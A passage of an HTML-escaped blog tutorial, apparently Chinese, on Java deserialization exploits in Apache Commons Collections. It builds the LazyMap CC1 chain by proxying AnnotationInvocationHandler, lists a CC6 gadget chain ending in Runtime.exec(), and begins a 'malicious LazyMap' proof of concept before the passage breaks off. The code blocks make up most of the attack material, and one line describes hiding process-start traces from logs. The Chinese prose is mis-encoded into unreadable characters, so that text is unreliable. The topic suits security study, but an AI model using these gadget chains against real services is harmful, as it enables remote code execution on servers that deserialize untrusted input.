&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">method&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">invoke&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">map&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>ä½œç”¨æ˜¯ç›‘æ§åˆ°è°ƒç”¨çš„æ–¹æ³•åæ˜¯getæ—¶è¿”å›Hacked Objectå­—ç¬¦ä¸²ï¼Œæˆ‘ä»¬å°è¯•å¤–éƒ¨è°ƒç”¨å®ƒ&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.lang.reflect.InvocationHandler&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.lang.reflect.Proxy&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.util.HashMap&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.util.Map&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">App&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">InvocationHandler&lt;/span> &lt;span style="color:#111">handler&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ExampleInvocationHandler&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">HashMap&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Map&lt;/span> &lt;span style="color:#111">proxyMap&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Map&lt;/span>&lt;span style="color:#f92672">)&lt;/span>&lt;span style="color:#111">Proxy&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">newProxyInstance&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Map&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getClassLoader&lt;/span>&lt;span style="color:#f92672">(),&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">[]{&lt;/span>&lt;span style="color:#111">Map&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">},&lt;/span> &lt;span style="color:#111">handler&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">proxyMap&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">put&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;hello&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;world&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">result&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#111">proxyMap&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;hello&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">result&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>å›æ˜¾Hook methd: get Hacked Object&lt;/p>
&lt;p>å›çœ‹&lt;code>sun.reflect.annotation.AnnotationInvocationHandler&lt;/code>ï¼Œå¦‚æœæˆ‘ä»¬æŠŠè¿™ä¸ªå¯¹è±¡ç”¨Proxyè¿›è¡Œä»£ç†ï¼Œé‚£ä¹ˆreadObjectæ—¶åªè¦è°ƒç”¨ä»»æ„æ–¹æ³• å°±ä¼šè¿›å…¥&lt;code>AnnotationInvocationHandler#invoke&lt;/code>è§¦å‘get&lt;/p>
&lt;h4 id="æ„é€ ">æ„é€ &lt;/h4>
&lt;p>å…ˆæ˜¯ç”¨LazyMapæ›¿æ¢TransformedMap&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Map&lt;/span> &lt;span style="color:#111">outerMap&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">LazyMap&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">decorate&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">innerMap&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">transformerChain&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>ç„¶åå¯¹sun.reflect.annotation.AnnotationInvocationHandlerè¿›è¡ŒProxy&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Class&lt;/span> &lt;span style="color:#111">cls&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">forName&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;sun.reflect.annotation.AnnotationInvocationHandler&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Constructor&lt;/span> &lt;span style="color:#111">construct&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">cls&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getDeclaredConstructor&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">Map&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">construct&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setAccessible&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">InvocationHandler&lt;/span> &lt;span style="color:#111">handler&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">InvocationHandler&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#111">construct&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">newInstance&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Retention&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">outerMap&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Map&lt;/span> &lt;span style="color:#111">proxyMap&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Map&lt;/span>&lt;span style="color:#f92672">)&lt;/span>&lt;span style="color:#111">Proxy&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">newProxyInstance&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Map&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getClassLoader&lt;/span>&lt;span style="color:#f92672">(),&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">[]{&lt;/span>&lt;span style="color:#111">Map&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">},&lt;/span> &lt;span style="color:#111">handler&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>ä»£ç†åçš„å¯¹è±¡æ˜¯proxyMapï¼Œä½†æ˜¯ä¸èƒ½ç›´æ¥å¯¹å…¶åºåˆ—åŒ– æˆ‘ä»¬çš„å…¥å£ç‚¹æ˜¯&lt;code>sun.reflect.annotation.AnnotationInvocationHandler#readObject&lt;/code>ï¼Œè¿˜è¦å†ç”¨AnnotationInvocationHandlerå¯¹è¿™ä¸ªproxyMapåŒ…è£¹&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">handler&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">InvocationHandler&lt;/span>&lt;span style="color:#f92672">)&lt;/span>&lt;span style="color:#111">construct&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">newInstance&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Retention&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">proxyMap&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>æ³¨æ„åˆ°ysoserialçš„æœ«å°¾æœ‰new ConstantTransformer(1)ï¼Œå¯ä»¥éšè—å¯åŠ¨è¿›ç¨‹çš„æ—¥å¿—ç‰¹å¾&lt;/p>
&lt;p>â€”â€”â€”â€”æ³¨æ„ï¼šLazyMapçš„CC1åŒæ ·æ— æ³•è§£å†³8u71åçš„ä½¿ç”¨é—®é¢˜ï¼Œå°½ç®¡å®ƒçš„æ¼æ´è§¦å‘åœ¨getå’Œinvokeï¼Œå’ŒsetValueæ— å…³&lt;/p>
&lt;h2 id="cc6">CC6&lt;/h2>
&lt;p>ä¸Šé¢æåˆ°CC1ç”±äº&lt;code>sun.reflect.annotation.AnnotationInvocationHandler#readObject&lt;/code>åœ¨8u71åçš„é€»è¾‘å˜åŒ–å¯¼è‡´å¤±æ•ˆï¼Œè¿™é‡Œæ¥çœ‹ä¸€æ¡è§£å†³é«˜ç‰ˆæœ¬Javaåˆ©ç”¨çš„CC6ï¼ˆä»£ç éƒ¨åˆ†æ¥è‡ªpç‰›&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">/*
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> -&amp;gt; Gadget chain:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> java.io.ObjectInputStream.readObject()
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> java.util.HashMap.readObject()
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> java.util.HashMap.hash()
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> org.apache.commons.collections.map.LazyMap.get()
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">org.apache.commons.collections.functors.ChainedTransformer.transform()
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">org.apache.commons.collections.functors.InvokerTransformer.transform()
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> java.lang.reflect.Method.invoke()
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> java.lang.Runtime.exec()
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">*/&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>CC6è§£å†³CC1çš„æ–¹æ¡ˆæ˜¯åœ¨ä¸Šä¸‹æ–‡ä¸­å¯»æ‰¾å…¶å®ƒå¯ä»¥è°ƒç”¨&lt;code>LazyMap.get&lt;/code>çš„åœ°æ–¹ï¼Œç”¨åˆ°çš„æ˜¯&lt;code>org.apache.commons.collections.keyvalue.TiedMapEntry&lt;/code>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">package&lt;/span> &lt;span style="color:#111">org.apache.commons.collections.keyvalue&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.io.Serializable&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.util.Map&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.util.Map.Entry&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.commons.collections.KeyValue&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">TiedMapEntry&lt;/span> &lt;span style="color:#00a8c8">implements&lt;/span> &lt;span style="color:#111">Entry&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">KeyValue&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">Serializable&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#00a8c8">long&lt;/span> &lt;span style="color:#111">serialVersionUID&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#111">8453869361373831205L&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#111">Map&lt;/span> &lt;span style="color:#111">map&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#111">key&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#75af00">TiedMapEntry&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Map&lt;/span> &lt;span style="color:#111">map&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#111">key&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">map&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">map&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">key&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">key&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#75af00">getKey&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">key&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#75af00">getValue&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">map&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">key&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// ...
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#75af00">hashCode&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#111">value&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getValue&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getKey&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span> &lt;span style="color:#f92672">?&lt;/span> &lt;span style="color:#111">0&lt;/span> &lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getKey&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">hashCode&lt;/span>&lt;span style="color:#f92672">())&lt;/span> &lt;span style="color:#f92672">^&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">value&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span> &lt;span style="color:#f92672">?&lt;/span> &lt;span style="color:#111">0&lt;/span> &lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#111">value&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">hashCode&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// ..
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>åœ¨å®ƒçš„&lt;code>getValue&lt;/code>ä¸­è°ƒç”¨äº†&lt;code>this.map.get&lt;/code>ï¼Œè€ŒhashCodeæ–¹æ³•è°ƒç”¨äº†getValueï¼ˆHashMapçš„å®ç°åŸç†ï¼‰ï¼Œåœ¨ysoserialä¸­æ˜¯åˆ©ç”¨&lt;code>java.util.HashSet#readObject&lt;/code>åˆ°&lt;code>HashMap#put()&lt;/code>åˆ°&lt;code>HashMap#hash(key)&lt;/code>æœ€ååˆ°&lt;code>TiedMapEntry#hashCode()&lt;/code>&lt;/p>
&lt;p>åœ¨pç‰›çš„ç®€åŒ–pocä¸­çœç•¥äº†å‰ä¸¤æ­¥ï¼Œé€šè¿‡&lt;code>HashMap#readObject&lt;/code>ç›´æ¥åˆ°&lt;code>HashMap#hash(key)&lt;/code>ï¼Œhashä¸­è°ƒç”¨äº†&lt;code>key.hashCode&lt;/code>ï¼ˆçº¯HashMapçš„å®ç°åŸç†&lt;/p>
&lt;p>æ„é€ pocï¼Œæˆ‘ä»¬åªéœ€è¦è®©è¿™ä¸ªkeyç­‰äºTiedMapEntryå¯¹è±¡ï¼Œå†æ”¹åŠ¨äº¿ç‚¹ç‚¹&lt;/p>
&lt;p>é¦–å…ˆæ˜¯æ¶æ„LazyMap&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.commons.collections.Transformer&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.commons.collections.functors.ChainedTransformer&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.commons.collections.functors.ConstantTransformer&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.commons.collections.functors.InvokerTransformer&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.commons.collections.keyvalue.TiedMapEntry&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.commons.collections.map.LazyMap&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.io.ByteArrayInputStream&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.io.ByteArrayOutputStream&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
